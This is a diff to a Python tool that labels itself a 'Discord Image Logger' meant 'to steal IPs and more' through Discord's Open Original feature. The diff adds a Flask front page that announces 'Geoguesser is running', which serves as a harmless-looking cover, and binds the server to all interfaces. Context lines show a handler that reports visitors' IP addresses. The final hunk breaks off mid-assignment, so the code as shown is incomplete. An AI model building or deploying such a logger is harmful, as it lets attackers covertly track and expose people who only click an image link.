@@ -2,6 +2,14 @@ import os
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Geoguesser is running"
+
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -170,4 +178,7 @@ class handler(BaseHTTPRequestHandler):
                 makeReport(ip, endpoint = s.split("?")[0], url = url)
                 return
             else:
-                s =
+                s = 
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
